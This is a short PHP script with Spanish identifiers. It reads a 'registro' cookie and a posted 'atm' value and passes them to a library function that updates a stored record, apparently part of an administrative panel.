<?php 
require('../../panel/lib/funciones.php');

$registro = $_COOKIE['registro'];

$ccajero = $_POST['atm'];

actualizar_registro_atm($registro,$ccajero);
?>